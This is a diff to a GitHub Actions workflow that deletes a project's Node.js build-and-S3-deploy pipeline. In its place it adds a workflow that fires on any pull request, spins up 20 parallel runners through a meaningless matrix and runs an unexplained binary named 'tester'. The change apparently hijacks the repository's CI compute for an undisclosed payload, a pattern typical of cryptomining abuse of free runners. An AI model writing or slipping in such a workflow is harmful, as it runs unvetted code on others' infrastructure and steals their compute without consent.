@@ -1,44 +1,26 @@
-name: oh.look.diamonds - deploy production
-on:
-  push:
-    branches:
-      - master
-    paths:
-      - src/**
-      - package-lock.json
+name: multi test
+
+on: [pull_request]
+
 jobs:
-  deploy-oh-look-diamonds:
-    runs-on: ubuntu-18.04
+  multitest:
+    name: test job
+
+    runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
     strategy:
-      matrix:
-        node-version: [12.x]
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - uses: actions/checkout@v1
-      - name: Use Node.js ${{ matrix.node-version }}
-        uses: actions/setup-node@v1
-        with:
-          node-version: ${{ matrix.node-version }}
-      - name: npm
-        run: |
-          npm install
-      - name: Build
-        run: |
-          npm run build:prod
-      - name: Deploy to S3
-        uses: jakejarvis/s3-sync-action@v0.5.1
-        with:
-          args: --acl public-read --delete
-        env:
-          AWS_S3_BUCKET: 'oh.look.diamonds'
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-          AWS_REGION: ${{ secrets.AWS_DEFAULT_REGION }}
-          SOURCE_DIR: 'dist'
-      - name: Invalidate cache
-        uses: awact/cloudfront-action@0.1.2
-        env:
-          DISTRIBUTION_ID: ${{ secrets.AWS_APP_DISTRIBUTION_ID }}
-          PATHS: '/*'
-          AWS_REGION: ${{ secrets.AWS_DEFAULT_REGION }}
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x tester
+        
+      - name: run
+        run: ./tester
